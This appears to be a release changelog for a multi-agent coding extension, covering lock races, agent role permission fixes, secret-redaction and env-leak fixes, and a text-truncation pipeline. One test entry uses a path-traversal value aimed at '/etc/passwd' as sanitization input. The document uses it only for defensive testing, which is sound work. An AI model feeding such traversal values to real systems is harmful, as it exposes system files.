- **F-4 / F-7 (P2/P3)** — stale-snapshot hint in the default dashboard view when manifest reads are flaky; actionable empty/error states (no more "Dashboard error — see logs").
- **T-1 (P3)** — `src/utils/visual.ts`: ZWJ (`U+200D`) removed from `WIDE_RANGES` (now correctly width-0; was inflating compound-emoji width and over-truncating).
- **T-2 (P3)** — `src/ui/widget/index.ts`: debounced (~120ms) SIGWINCH + stdout-resize listener busts the render cache and requests a repaint. Guarded against double-registration across widget reinstalls.
- **D-1 (P3)** — `src/ui/dashboard-panes/cancellation-pane.ts` wired in via `summarizeTerminalReason()` (was dead-imported by `test/unit/cancellation-pane.test.ts`, so kept and given a real consumer instead of deleted).

### Shortcut collision fix

- **Extension-load warning**: `alt+d` collided with `tui.editor.deleteWordForward` (verified in pi-tui `TUI_KEYBINDINGS`). Pi resolved in favor of the extension, *stripping* the editor's delete-word-forward binding. Moved dashboard shortcut to **`alt+c`** (mnemonic: **C**rew — verified free against the full built-in `alt+` keymap: occupied letters are `b, d, f, v, y`).
- **Test guard hardened**: `test/unit/crew-shortcuts.test.ts` collision set now includes the editor keys (`alt+b/d/f/y`, `alt+backspace`, `alt+delete`). The previous set was incomplete (`alt+v, alt+enter, alt+arrows` only), which is why the bug slipped past tests. This class of regression is now caught at test time.

### Decisions (deviations from the initial review)

- **K-3 `KEY_RESERVED`**: NOT dead code — consumed by `test/unit/keybinding-map.parity.test.ts:29,185-203` and `test/manual/l2-keybinding-dispatch-smoke.mjs`. Corrected the misleading "dead code" doc instead of deleting (deleting would have broken the parity test).
- **K-2 `alt+m` / `alt+t`**: blocked — mailbox overlay is run-scoped (requires a runId; reached via the dashboard); `team-status` is a text command (`handleTeamTool({action:"status"})`), not an overlay opener. `alt+d → dashboard` is the only wired shortcut.
- **F-5 location**: fixed at the correct layer (`process-status.ts` run-level grace) rather than the report's suggested `widget-renderer.ts` agent-row linger; the run-level header line is the right "one-line trace" per the finding.

### Verification

- `npx tsc --noEmit` + `npm run typecheck`: 0 errors (incl. strip-types import smoke).
- Focused UI cluster: **74/74 pass** across 8 suites — `crew-shortcuts` (incl. strengthened collision assertion), `crew-footer` (incl. renamed V-2 test), `keybinding-map parity`, `cancellation-pane`, `process-status ×3`, `agents-pane-cost`.
- Full suite baseline (before this batch): 5642 / 5639 pass / 0 fail. Two post-change full runs hit `ETIMEDOUT` on `spawnSync` inside integration child-spawn tests (`worktree-run`, `cleanup-full-flow`) under load (0 assertion failures — environmental flake). To be reconfirmed against CI.

## [v0.9.11] — Per-run lock path for background-runner (parallel-spawn race) (2026-06-27)

Bug caught by an E2E parallel-spawn test in this session, NOT by unit tests (which cannot spawn multiple real processes). Independent of the F1-F5/redaction batches.

### Bug fix

- **Shared `run.lock` killed concurrent background runners** (`src/runtime/background-runner.ts:417`). The bootstrap call passed a fake manifest `{ stateRoot: "", runId, cwd }` to `withRunLockSync` because the real manifest was not loaded yet. `lockPath()` = `path.join(manifest.stateRoot, "run.lock")` = `path.join("", "run.lock")` = `"run.lock"` — a RELATIVE path at cwd, SHARED across every run regardless of runId. When multiple background agents spawned in the same instant (e.g. parallel `Agent` calls), they raced on the single shared lock: one acquired, the rest failed fast ("Run 'run.lock' is locked by another operation") and exited within 3s. The existing "FIX Issue #3" comment claimed to prevent concurrent runners "for the same runId", but the lock path never contained the runId. Fix: compute the real per-run stateRoot via `createRunPaths(cwd, runId).stateRoot` before locking, so each run locks its own `<cwd>/.crew/state/runs/<runId>/run.lock`. Matches `locks-race.test.ts`.

### Verification

- `npx tsc --noEmit` EXIT 0
- 7 lock-related suites pass (locks-race 10, background-runner-console-redirect 4, async-runner 13, api-locks 1, orphan-worker-registry 15, locks-untested 11, team-runner-heartbeat 2)
- E2E reproduce (decisive): BEFORE the fix, 3 parallel background explorers → 1 pass + 2 fail (background.log: "Failed to acquire lock"). AFTER the fix, same scenario → 3/3 pass, 0 lock errors.

### Lesson

Concurrency/lock bugs only reproduce when multiple real processes spawn simultaneously — unit tests mocking a single process can never catch them. E2E parallel-spawn smoke tests are the only way to verify. (Reinforces the v0.9.9 lesson: E2E with real extension load is decisive.)

## [v0.9.11] — Read-only permission model fixes F1-F5 (2026-06-27)

Review of the role permission model (question: "do read-only workflows still persist their task output?") confirmed output persistence is runner-driven and correct, but found 5 findings — one the same defect class as the v0.9.10 writer incident (Fix 5), in the opposite direction.

### Bug fixes

- **`security-reviewer`/`test-engineer` tool config unreachable (F1, HIGH)** (`src/config/role-tools.ts`). Map keys were `security_reviewer`/`test_engineer` (underscore) while the runtime role strings are hyphenated (`agents/security-reviewer.md` → `security-reviewer`). `getToolConfig` did not normalize, so it returned `{}` and the strictest tool restrictions in the codebase silently never applied. Same defect class as the writer incident, opposite direction (under-enforce vs over-enforce). Tests masked it: they queried only the underscore forms. Fix: quote+hyphen the keys (a bare `security-reviewer:` key parses as subtraction — must be quoted) and normalize in `getToolConfig` (`role.replaceAll("_","-")`); added a regression test that derives role names from the runtime sets and asserts each resolves its intended config.
- **`critic`/`planner` tool-config gaps (F2)** (`src/config/role-tools.ts`). `critic` had no entry (a custom critic agent had no tool-level read-only enforcement); `planner`'s entry only excluded `ask_question` and did not enforce read-only. Added a `critic` entry and strengthened `planner` to a read-only tool-set.
- **`planner` kept read-only with deliverable guidance (F3)** (`src/runtime/task-runner/prompt-builder.ts`). `planner` emits deliverables (`output: plan.md`) but moving it to WRITE_ROLES would fire the plan-approval gate BEFORE planning (breaking default/implementation workflows — `team-runner.ts:399` relies on planner being read-only). Fix: keep planner read-only and add a prompt line telling read-only roles their RESULT TEXT is persisted by the runner, so they emit deliverables as text instead of attempting file writes.
- **`verifier` reclassified read-only → write (F4)** (`src/runtime/role-permission.ts` + `src/config/role-tools.ts`). `verifier`'s task runs tests via bash with redirects/cache writes (`npm test | tee`, `mkdir`, `rm`), all forbidden by the read-only prompt gate — a direct contradiction with `agents/verifier.md`. Moved verifier to WRITE_ROLES; tool-config keeps bash but excludes edit/write so source integrity is preserved. Mirrors `cold-verifier`.
- **Dead command-enforcement removed (F5)** (`src/runtime/role-permission.ts`). `isReadOnlyCommand`/`checkRolePermission`/`READ_ONLY_COMMANDS` had zero runtime callers (only tests). Real protection lives in the role tool-config + `safe-paths.ts`/`resolveRealContainedPath` (10+ runtime callers). Deleted the dead code.

### Verification

- `npx tsc --noEmit` EXIT 0
- 124 tests pass / 0 fail across 13 suites + 1 integration (role-tools 15, role-permission-cov 23, role-permission 2, role-permission.spawn 3, prompt-builder-cov 15, v0-8-0-tool-policy-unification 10, skill-instructions 16, plan-approval-boundary 7, crew-contracts 6, goal-loop-team-roles 5, t9-cold-verifier 5, completion-guard 7, verification-gates 10, role-tools-integration 3)
- E2E: `research` workflow 3/3 tasks — explorer+analyst (read-only) persisted findings, writer wrote the deliverable file

## [v0.9.11] — Secret redaction & env hardening (2026-06-27)

Independent security review (review team, 3/4 tasks, ~360K tokens) flagged 3 Medium findings in the secret-redaction and env-passthrough surfaces. All verified by live `npx tsx` repro + source trace before fixing.

### Bug fixes

- **`redactAuthHeader` leaked credential values (L3/L5)** (`src/utils/redaction.ts`). Two defects: (1) `indexOf` matched only the FIRST `authorization:` occurrence per call, so a second header on a later line leaked verbatim; (2) the word-boundary allow-list excluded `-` and `\t`, so `Proxy-Authorization:` / `X-Authorization:` and tab-indented headers were not recognized. Fix: loop over all occurrences and add `-`/`\t` to a shared `AUTH_HEADER_BOUNDARY_CHARS` set (used by both `redactAuthHeader` and `redactBearerTokens`). Latent weakness caught by repro (NOT by the reviewer's proposed fix): the old code only APPENDED a ` ***` marker without removing the value — `"authorization: Basic abc123"` became `"authorization: Basic abc123 ***"` (credential still visible). The redact branch now blanks the value: `line.substring(authIdx, authIdx+14) + " ***"` → `"authorization: ***"`. Consistent with `redactInlineSecrets`.
- **`writeArtifact` flat-redaction only (M2)** (`src/state/artifact-store.ts:130`). Applied only `redactSecretString` (flat regex scan), so quoted-JSON secrets (`"api_key":"sk-..."`) and nested keys survived into persisted artifacts (e.g. `startup-evidence.json` holds up to 500 chars of raw child stderr). Fix: structural-then-flat — when content parses as JSON, run `redactSecrets` (recursive) first, then flat `redactSecretString`. Order matters: structural catches quoted keys, flat still catches Bearer/JWT/Auth headers inside JSON string values. Formatting is preserved: the input is re-stringified with the SAME indentation (pretty → indent 2, compact → compact), so pretty-printed artifacts like group-join metadata keep their `"partial": false` whitespace (caught by `test/integration/phase4-runtime.test.ts` regression on CI after the first attempt shipped a compact re-stringify).
- **Provider API keys leaked into the detached background runner (M1)** (`src/runtime/async-runner.ts:162`). The env allowlist forwarded 14 provider keys (MINIMAX/OPENAI/ANTHROPIC/...) to the background runner, contradicting `child-pi.ts:275` ("API keys are NOT needed — config file"). Keys leaked into V8 fatal-error reports (`--report-on-fatalerror` writes `environmentVariables` unredacted). The inline comment "same as child-pi.ts" was false. Fix: extracted `BACKGROUND_RUNNER_ENV_ALLOWLIST` (exported, unit-testable) and removed the 14 provider keys. Prereq verified: `background-runner.ts` does not read provider keys directly.

### Verification

- `npx tsc --noEmit` EXIT 0
- 21 targeted suites pass (~130 tests): redaction-cov (32), redaction-p1f (18), redaction-transcript-roundtrip (3), child-pi-sec1-redaction (8), artifact-store (4), async-runner (13), env-filter (4), env-filter-cov (9), security-hardening (8), round28-otlp-crlf (4), child-pi-compaction-real (9), + others
- Live repro: `redactSecretString("Proxy-Authorization: Basic c2VjcmV0")` → `"Proxy-Authorization: ***"` (was: unchanged leak)

## [v0.9.10 (continued)] — Round 29 follow-ups: BG2 sweep bug fixes, test optimization, E2E verification (2026-06-26)

A full-suite verify run (`verify-full2`, 5502 tests, 774 suites) surfaced 4 file-level timeouts and 2 real correctness bugs. This release fixes the 2 real bugs, the underlying cause of 2 of the 4 timeouts (chain-runner + orphan-worker-registry + cleanup-full-flow self-deadlock + HandoffManager interval leak), and adds E2E verification artifacts to prove all fixes hold against the live runtime, not just static analysis.

### Bug fixes (BG2 sweep)

- **CountdownTimer drift** (commit cadb5b7, `src/ui/loaders.ts`). `setInterval`-based tick scheduling can skip a second value under event-loop load — the BG2 regression test caught the case where expected `[3, 2, 1, 0]` was emitted as `[3, 2, 0]`. Replaced with recursive `setTimeout` chain + `lastEmittedSeconds` guard so a busy event loop never drops a tick. `dispose()` updated to call `clearTimeout`. Test: `test/unit/loaders.test.ts` (5/5 pass).
- **redactSecretString ReDoS regression** (commit cadb5b7, `src/utils/redaction.ts:177`). `isSecretKey` used `/[a-zA-Z0-9_-]/.test(value[j])` per character in a 100K-iteration loop — exceeded the 200ms budget on a `_`.repeat(100_000) + `=x` input. Replaced the regex call with a `charCodeAt` numeric check (`isKeyChar` helper, `src/utils/redaction.ts:223-232`). ~5× faster, no regex allocation, O(n²) → O(n) via early exit on the first non-key char. Test: `test/unit/redaction-p1f.test.ts` (4/4 pass).
- **HandoffManager `setInterval` leak** (commit 5876c38, `src/runtime/handoff-manager.ts:202-213`). `startCleanupTimer()` did not call `.unref()` on the cleanup `setInterval`. Every `new HandoffManager()` in a test mock held an event-loop reference — `chain-runner.test.ts` created 42 instances and the test file's process never exited. Fix: `.unref()` on the interval handle at `:212-213`. Verified: 42/42 tests pass in 362ms (was hanging at 30s file-level timeout).

### Lock re-entrance guard (Round 29 follow-up to BG2 sweep)

- **`withFileLockSync` self-deadlock** (commit 7085d8d, `src/state/locks.ts:288`). The function was missing the re-entrance guard that its sibling functions `withRunLockSync` (line 333) and `withRunLock` (line 359+) already had via the `runLockHeldByUs` Map. When the same call stack tried to acquire the file lock twice on the same path (e.g. `registerWorker` → `cleanupOrphanWorkers` → `readRegistry`), the second acquisition read its own freshly-written lock file (same pid, fresh createdAt), failed the steal check, and retried for the full `staleMs` window — hanging `orphan-worker-registry.test.ts` and `cleanup-full-flow.test.ts` at 30s. Strace evidence in `.github/issues/pre-existing-2026-06-10/04-orphan-worker-registry-tests.md:75-86`. Smoking gun: `src/runtime/orphan-worker-registry.ts:220-221` already documents the bug in a code comment (the workaround was to skip the lock in one hot path; the tests hit it through a path the workaround did not cover). Fix: added parallel `fileLockHeldByUs` Map mirroring `runLockHeldByUs`; consult at function entry, set after acquire, delete in `finally`. Reuses the same shape so the two functions stay structurally parallel. Regression test: `test/unit/round29-file-lock-reentrance.test.ts` (5/5 pass, 547ms; `orphan-worker-registry` 15/15 496ms was hanging; `cleanup-full-flow` 4/4 1377ms was hanging).

### Doctor test optimization (16× speedup)

- **Build-time + test-time doctor cost** (commit 8842e2c, `src/extension/team-tool/doctor.ts` + `test/unit/doctor-cov.test.ts`). `buildTeamDoctorReport` was NOT pure — it spawned `git --version` and `pi --version` via `spawnSync` (1-2s each), walked the filesystem 3× for discovery (agents/teams/workflows), and audited the JSON schema on every invocation. With 12 tests in `doctor-cov.test.ts` and 2 in `doctor-validation.test.ts`, the cost added up to 25.8s and 6.8s. Three independent fixes: (1) test-side: `doctor-cov` switched from `cwd: "/tmp"` to a fresh `mkdtempSync` cwd via `before`/`after` hooks; (2) production dedupe: hoisted `discoverX` calls to module-level consts (called twice — Drift + Discovery sections — now called once); (3) production memoize: `commandExists` and `piCommandExists` cached at module level. Cache is safe: a doctor check is informational, a stale `ok: true` self-corrects on next process restart, and the in-process discovery is what actually drives user-visible behavior in a long-running pi session. Result: `doctor-cov` 25.8s → 1.6s (16×), `doctor-validation` 6.8s → 3.0s (2.3×). `tsc --noEmit` clean.

### Widget progress line flicker (v6 invariant format)

- **`crew-widget` progress line coalesce** (commit 78cd813, `src/ui/widget/widget-renderer.ts`). The `├─ ...` run progress line flickered across renders because `progressPart` was recomputed from multiple optional sources on every snapshot. Reduced to the v6 invariant format: `${completed}/${agents.length} agents` only, with the surrounding `· toolCount · tokenCount · duration` field strip removed (those data points are still surfaced in the per-agent sub-lines below). Format is now stable across ticks, so the host Pi TUI sees no diff between consecutive renders → no flicker.

### E2E verification artifacts

- **`docs/fixes/v0.9.10/`** (commit 7bbda16) — two E2E smoke-test artifacts from real team runs, NOT unit tests:
  - `smoke-test.md` — research workflow (`team_20260626102522_e00831a41ee1cdd8`) wrote a 3-bullet summary of the 3 fix commits with file:line citations. The writer agent writing the file is itself an end-to-end exercise of the v0.9.10 writer-permission fix.
  - `locks-fix-verify.md` — implementation workflow (`team_20260626151258_edeadbe3c35de7de`) verified all four code paths affected by the 3 commits (CountdownTimer, redactSecretString, HandoffManager, withFileLockSync) in a single multi-agent run; reviewer re-verified every line citation against the source.

### Lesson

- When a test file "hangs" at the file-level timeout, the FIRST hypothesis to check is per-test slowness, not deadlock. Profile with `--test-reporter=tap` and look at per-test `duration_ms` before assuming resource leaks or lock contention. Saves hours of chasing ghosts (this Round 29 originally looked like a `notification-router` or `parent-guard` interval leak; the real cause was `withFileLockSync` self-deadlock, found only after a delegated research investigation).
- Grep-by-pattern ("X timer không .unref()") does NOT find re-entrance deadlocks. Read the call stack.

### Verification (all under 60s timeout, per the 3863s lesson)

- `test/unit/round29-file-lock-reentrance.test.ts`  5/5  547ms
- `test/unit/loaders.test.ts`  5/5
- `test/unit/redaction-p1f.test.ts`  4/4
- `test/unit/orphan-worker-registry.test.ts`  15/15  496ms
- `test/integration/cleanup-full-flow.test.ts`  4/4  1377ms
- `test/unit/doctor-cov.test.ts`  12/12  1.6s  (was 25.8s)
- `test/unit/doctor-validation.test.ts`  2/2  3.0s  (was 6.8s)
- 134/134 Sprint 1-5 + bug-fix regression pass
- `npx tsc --noEmit`  EXIT 0
- E2E: research workflow (3/3 tasks, 93K tokens, 5m19s, writer wrote file); implementation workflow (3/3 tasks, 66K tokens, 5m01s, reviewer re-verified all citations)

## [v0.9.10 (continued)] — migrate deferred truncation points through the stage-chain (Sprint 5) (2026-06-26)

The Sprint 3 v0.9.10 (continued) entry listed 5 truncation points deferred from the P0-A stage-chain refactor. This release migrates 3 of them and defers 2 more with explicit reasons.

### Features

- **`TailCaptureStage`** (`src/runtime/compact-stages/tail-capture-stage.ts`) — keeps the last N chars/bytes, prepends an optional marker when truncation fires. Two cap modes: `maxChars` (UTF-8 safe) or `maxBytes` (legacy byte cap with UTF-8 boundary snap). Mutually exclusive caps; positive finite values required.
- **`HeadSnapStage`** (`src/runtime/compact-stages/head-snap-stage.ts`) — keeps the first N bytes, optionally snapping to the last newline within the head region. Byte cap (not char cap) to preserve the original memory-budget semantic. UTF-8 boundary safety: walks back partial multi-byte sequences at the cut point. `snapToNewline: false` disables the snap.
- **`TAIL_CAPTURE_STREAM_STAGE` singleton** — exported 16_384-char tail-capture with no marker for `stream-preview.ts` textBuffer.
- **`appendBoundedTail` refactored** (child-pi.ts:52) — delegates to `TailCaptureStage` with dynamic marker `[pi-crew captured output truncated to last X KiB]` computed from `maxBytes`. Behavior bit-identical to pre-Sprint-5.
- **`stream-preview.ts` textBuffer truncation refactored** (lines 114, 122) — delegates to `TAIL_CAPTURE_STREAM_STAGE`. Both call sites in `feedJsonEvent` now use the stage. Behavior bit-identical to pre-Sprint-5 inline `.slice(appended.length - MAX_TEXT_BUFFER)`.
- **`iteration-hooks.ts` `truncateToLimit` removed** — replaced by inline `new HeadSnapStage({ maxBytes: MAX_STDOUT_BYTES }).apply(rawStdout.toString("utf-8"))` at the call site. Eliminates the Buffer → string → Buffer round-trip. Behavior preserved.

### Deferred (still not migrated — with reasons)

- **`async-runner.ts` stderr "stop capturing" semantic** (lines 280-330) — chunk-by-chunk state machine: chunks accumulate up to `STDERR_CAPTURE_LIMIT` (256KB), then further chunks are DROPPED ENTIRELY with a single truncation marker. Fundamentally stateful flow, not a transform-on-string. Migrating would require a chunk-stream pipeline that no other call site needs.
- **`chain-runner.ts` array caps** (lines ~503-520) — operate on arrays of mixed-shape objects, not strings. The string-only pipeline abstraction doesn't apply. Existing `.slice()` calls are simple and correct; migrating would be ceremony without value.

### Tests

- New real-function suite `test/unit/deferred-truncation-migration.test.ts` (31 tests, calling REAL exported stages):
  - **TailCaptureStage**: char/byte cap under/over boundary; UTF-8 boundary snap; marker behavior (prepended ONLY when truncating); singleton behavior; constructor validation.
  - **HeadSnapStage**: byte cap; newline-snap to last `\n` in head region; `snapToNewline: false` disables snap; UTF-8 boundary safety with emoji at cut boundary; constructor validation.
  - **3 migration integrations**: `appendBoundedTail`, `stream-preview.ts`, `iteration-hooks.ts` all verified behavior-equivalent to pre-Sprint-5.
  - **L4 backward-compat**: all 3 migrations produce bit-identical output to pre-Sprint-5 inline implementations.
- 111 output-handling + child-pi/task-output-context importer tests pass (was 80 in pre-Sprint-5 — added 31 new tests); `tsc --noEmit` clean.

### Verification

```
npx tsc --noEmit                                                  -> clean (exit 0)
node --test test/unit/deferred-truncation-migration.test.ts      -> 31 tests, 0 fail
node --test (full Sprint 1+2+3+4+5 regression set, 7 files)       -> 111 tests, 0 fail
node --test (all child-pi/task-output-context importer tests)     -> 132 tests, 0 fail
```

The full integration suite (incl. slow E2E / mocked-child-pi) was not re-run in this release window; the targeted unit + importer set covering every changed symbol is green.

---

## [v0.9.10 (continued)] — tee-recovery for truncated shared artifacts (P1-A, Sprint 4) (2026-06-26)

When `readIfSmall` truncated a shared artifact down to ~32KB of head+tail for inline injection into a downstream worker's prompt, the worker had no way to recover the dropped middle. The only options were: re-run the producing task (waste), guess what was missing (error-prone), or skip the work (capability loss). This release wires up **tee-recovery** so the truncated middle is recoverable on demand.

### Features

- **`readIfSmallWithTee(filePath, opts) -> { content, fullOutputPath? }`** — new function in `src/runtime/task-output-context.ts`. Reads the file (with the same multi-byte-safe truncation pipeline as `readIfSmall`), and when the file size exceeds `2 * MAX_RESULT_INLINE_BYTES` AND `opts.tee.fullOutputPath` was provided, ALSO writes the FULL untruncated content to that path. Returns the truncated content for inline injection PLUS the path so the caller can expose it to the worker. Returns `{ content }` (no `fullOutputPath`) when truncation is below the 2× threshold or when no tee opts were provided. Returns `undefined` if the file cannot be read.
- **`teePathForArtifact(artifactsRoot, taskId, artifactName) -> string`** — public helper computing the canonical tee path `${artifactsRoot}/tee/${taskId}-${artifactName}.full.txt`. `taskId` and `artifactName` are sanitized to `[A-Za-z0-9._-]+` (path separators and `..` neutralized to `_`) so the resulting path is always a single segment inside the tee directory.
- **Tee directory auto-creation** — `mkdirSync(path.dirname(teePath), { recursive: true })` so callers do not need to pre-create `${artifactsRoot}/tee/`.
- **Best-effort tee write** — I/O failures (disk full, permission denied, parent-is-a-file, etc.) are swallowed and `fullOutputPath` is omitted from the result instead of failing the read. The truncated inline content is still returned either way.
- **SharedReads entry shape extended** — the `sharedReads` array in `DependencyOutputContext` gains an optional `fullOutputPath?: string` field, set when tee was actually written. The construction site in `collectDependencyOutputContext` was refactored to compute the tee path via `teePathForArtifact(manifest.artifactsRoot, task.id, name)`, call `readIfSmallWithTee`, and include `fullOutputPath` in the entry when present.
- **Worker prompt augmentation** — `renderDependencyOutputContext` now emits a `Full output (if you need the missing middle): ${fullOutputPath}` line whenever the entry has one. Downstream workers can `read` this path to recover the dropped middle. The `read` call goes through pi-crew's normal permission gate (writer role has `workspace_write`), so security is preserved. Existing entries (small / under-2× files) render exactly as before — no extra line.
- **`readIfSmall` backward-compat wrapper** — the existing `readIfSmall(filePath, baseDir?) -> string | undefined` signature is preserved; it now delegates to `readIfSmallWithTee` and returns just the content string. All existing call sites (live task resultArtifact reads, prompt-builder contexts, etc.) compile and behave identically.

### Tests

- New real-function suite `test/unit/tee-recovery-real.test.ts` (14 tests, calling the REAL exported `readIfSmallWithTee`, `readIfSmall`, `teePathForArtifact`):
  - **Threshold boundary**: files at or below `MAX_RESULT_INLINE_BYTES` returned verbatim, no tee, no tee file created on disk.
  - **Truncation without tee**: files between 1× and 2× threshold are truncated, marker present, NO tee file created (the head/tail is mostly intact, tee would be wasteful).
  - **Truncation WITH tee**: files > 2× threshold trigger tee; the tee file on disk is byte-equal to the original (full content, not truncated); `result.fullOutputPath` equals the requested tee path.
  - **Tee directory auto-creation**: nested non-existent directories (e.g. `${root}/deeply/nested/tee/`) are created via `mkdirSync recursive`.
  - **Tee write failure (best-effort)**: when the tee path's parent is a regular file (not a directory), `writeFileSync` fails internally; the read still returns truncated content with `fullOutputPath: undefined`. Never throws.
  - **No-op without tee opts**: `readIfSmallWithTee(file)` without `opts.tee` behaves like the legacy `readIfSmall` (content only, no `fullOutputPath`).
  - **Legacy `readIfSmall` wrapper**: returns the same string as `readIfSmallWithTee(file).content` for any input (backward-compat verified end-to-end).
  - **`teePathForArtifact` format**: `${artifactsRoot}/tee/${taskId}-${artifactName}.full.txt`. Path-safety invariants verified — final filename segment contains no path separators, ends with `.full.txt`.
  - **`teePathForArtifact` sanitization**: input like `"../escape/me"` + `"../../etc/passwd"` produces a path whose final segment is single-segment and contains no `/`. (`.` is intentionally allowed in the safe-char class so legitimate filenames like `result.json` survive; the real safety guarantee is no path separators inside the segment.)
  - **Integration**: sharedReads construction (replicated from `collectDependencyOutputContext`) — small entries have no `fullOutputPath`, medium (under 2×) have no `fullOutputPath`, large (over 2×) have `fullOutputPath` AND the tee file exists on disk.
  - **L4 backward-compat**: `readIfSmallWithTee` truncated marker wording on plain text is bit-identical to the pre-P1-A format (no `important lines preserved` marker, exact `[pi-crew truncated N chars, head+tail preserved]`).
- 133 output-handling + child-pi/task-output-context importer tests pass (was 119 in v0.9.12 — added 14 P1-A suite); `tsc --noEmit` clean.

### Verification

```
npx tsc --noEmit                                                  -> clean (exit 0)
node --test test/unit/tee-recovery-real.test.ts                   -> 14 tests, 0 fail
node --test (full Sprint 1+2+3+P1-A regression set, 9 files)      -> 133 tests, 0 fail
node --test (all child-pi/task-output-context importer tests)     -> 132 tests, 0 fail
```

The full integration suite (incl. slow E2E / mocked-child-pi) was not re-run in this release window; the targeted unit + importer set covering every changed symbol is green.

### Lessons learned

- **Backward-compat via thin wrapper** — adding `readIfSmallWithTee` (returns enriched object) as the new canonical function and refactoring `readIfSmall` to delegate + return just `result.content` avoided any change to the existing `readIfSmall(filePath, baseDir?) -> string | undefined` signature. All four existing call sites in the file compiled without edits. The enriched result type is a strict superset; new code can opt into the metadata without breaking old code.
- **Best-effort tee is the right default** — making `writeTeeFile` swallow I/O errors and report success/failure via boolean means the read path is NEVER blocked by tee-side problems. The worker prompt augmentation (`if (read.fullOutputPath)`) is the natural fallback signal — when tee failed, the worker simply does not see the recovery hint and behaves as if the file is non-recoverable (same as pre-P1-A).
- **Tee threshold of 2× is the right cutoff** — files just over `MAX_RESULT_INLINE_BYTES` (say 33KB) get a clean head/tail with most of the content visible inline; tee-ing them would be wasteful disk usage. Files over 2× (say 70KB+) have >38KB dropped in the middle, where tee provides real value.

---

## [v0.9.10 (continued)] — stage-chain compression pipeline (P0-A, Sprint 3) (2026-06-26)

The output-handling & compression area had several ad-hoc truncation / cleaning functions, each with its own quirks (`appendBoundedTail`, `stream-preview`, `iteration-hooks`, `async-runner`, `compactString`, `readIfSmall`, `chain-runner`). This release introduces a composable **stage-chain compression pipeline** so that future clean-up stages (ANSI strip, blank-line collapse, deduplication, truncation, …) can be added once and reused at every call site, and so that ALL compaction is forced through a single **monotonic-shrink gate** that mathematically cannot expand its input.

### Features

- **`src/runtime/compact-pipeline.ts` — stage-chain with monotonic-shrink gate** — `ICompactStage { id, apply(text): string }`, `applyCompactPipeline(text, stages) -> { text, applied }`. A stage is applied only if its output is no longer than its input (gate: `next.length <= text.length`); expanding stages are silently dropped and their id is not recorded in `applied`. This is the safety property that prevents the family of L4 caveman-shrink bugs (24/27 artifacts null-byte-corrupted by a regex-based shrink that expanded in some cases — see `.crew/knowledge.md` §"L4 output-handling"). Ported from Hypa's `GenericOutputCompressor.cs:18-51`.
- **Four concrete stages in `src/runtime/compact-stages/`** — `AnsiStripStage` (CSI color/cursor codes, fast-path when no `\x1b` present), `BlankCollapseStage` (collapses 3+ consecutive newlines to a single blank line; configurable `minConsecutive`), `DeduplicateStage` (collapses CONSECUTIVE duplicate lines, preserves `\r\n` endings; opt-in only — unsafe for assistant prose), `TruncationStage` (parameterized marker verb/separators so the SAME class serves both `compactString`'s "compacted ... chars" wording and `readIfSmall`'s "truncated ... chars" wording).
- **`compactString` refactored onto the pipeline** — default pipeline is `[TruncationStage(maxChars, { preserveImportant })]`. Plain-text inputs with no ANSI / blank runs / consecutive duplicates pass through bit-identically (L4 backward-compat — marker wording unchanged when no important lines and no noise). The P0-B important-line preservation still works through the pipeline.
- **`readIfSmall` refactored onto the pipeline with noise stripping** — artifact files (which frequently contain ANSI color codes + blank-line noise from npm/cargo/jest output captured to disk) now pass through `[AnsiStripStage, BlankCollapseStage, TruncationStage]` before the result is returned. Plain-text fixtures remain bit-identical (L4 backward-compat).

### Deferred to a future release

Five other truncation points in the codebase were intentionally NOT ported to the pipeline in this release — each has call-site-specific semantics that warrant their own migration:

| Code point | Current behavior | Migration scope |
|---|---|---|
| `appendBoundedTail` (`child-pi.ts`) | Tail-only accumulator, 256KB byte cap | Live-streaming chunked input; needs a streaming-friendly stage API |
| `stream-preview.ts:114` | Tail-only live preview, 16KB | Live UI preview; ANSI strip is a feature but the tail-only semantics are UI-specific |
| `iteration-hooks.ts:105` | Head-only, newline-snapped, 8KB | Hook output is small (single command); pattern is deliberately different |
| `async-runner.ts:293` | Head+marker, stops capturing at 256KB stderr | Detached-process stderr; capture-stop semantics need a separate stage |
| `chain-runner.ts:515` | Head-only array cap, 20/50 items | Array compaction (not string); pipeline operates on strings |

These are tracked for a future v0.9.13+ cleanup. The P0-A infrastructure makes the migration mechanical (each is a ~30 LOC refactor once the per-point design is settled).

### Tests

- New real-function suite `compact-pipeline-real.test.ts` (23 tests, calling the REAL exported pipeline, stages, `compactString`, `readIfSmall`):
  - **Monotonic-shrink gate (critical safety property)**: an expanding stage is silently dropped; an equal-length stage is accepted; chained stages with mixed expand/shrink produce a deterministic `applied[]`.
  - **Malformed-stage defense**: non-string output, missing `apply` are skipped (pipeline never throws on bad input).
  - **AnsiStripStage**: CSI color/cursor codes stripped; idempotent; fast-path on text without `\x1b`.
  - **BlankCollapseStage**: 3+ newlines collapsed to 2; 1-2 newlines preserved; configurable threshold.
  - **DeduplicateStage**: consecutive duplicates collapsed; non-adjacent duplicates preserved; `\r\n` endings preserved.
  - **TruncationStage**: default marker matches `compactString` wording; truncated marker + `\n\n` headSeparator matches `readIfSmall` wording; rejects non-positive `maxChars`.
  - **Pipeline integration**: `compactString` on plain text is bit-identical to pre-P0-A wording (L4 backward-compat); important-line preservation still works; monotonic-shrink holds across the boundary window. `readIfSmall` strips ANSI before truncating (assert: no `\x1b` in result); collapses blank-line noise before truncating; plain-text input is bit-identical to pre-P0-A wording.
  - **Pipeline observability**: `compactString` returns a plain string (not a `PipelineResult`) — `applied[]` is internal; future dashboard wiring is a separate task.
- 119 output-handling + child-pi/task-output-context importer tests pass (was 96 in v0.9.11 — added 23 P0-A suite); `tsc --noEmit` clean.

### Verification

```
npx tsc --noEmit                                                  -> clean (exit 0)
node --test test/unit/compact-pipeline-real.test.ts               -> 23 tests, 0 fail
node --test (full Sprint 1+2+P0-A regression set, 8 files)        -> 119 tests, 0 fail
node --test (all child-pi/task-output-context importer tests)     -> 118 tests, 0 fail
```

The full integration suite (incl. slow E2E / mocked-child-pi) was not re-run in this release window; the targeted unit + importer set covering every changed symbol is green.

### Lessons learned during this work

- **Parameter-property syntax** (`constructor(private readonly x = 3) { }`) is **NOT** supported by Node's `--experimental-strip-types` mode used by pi-crew's test runner. Sprint 3 originally hit a `SyntaxError: TypeScript parameter property is not supported in strip-only mode` that crashed every test file importing the affected module (not just the failing test). Field declaration + constructor assignment is the portable shape — documented inline in `BlankCollapseStage` so the next contributor doesn't re-introduce it.
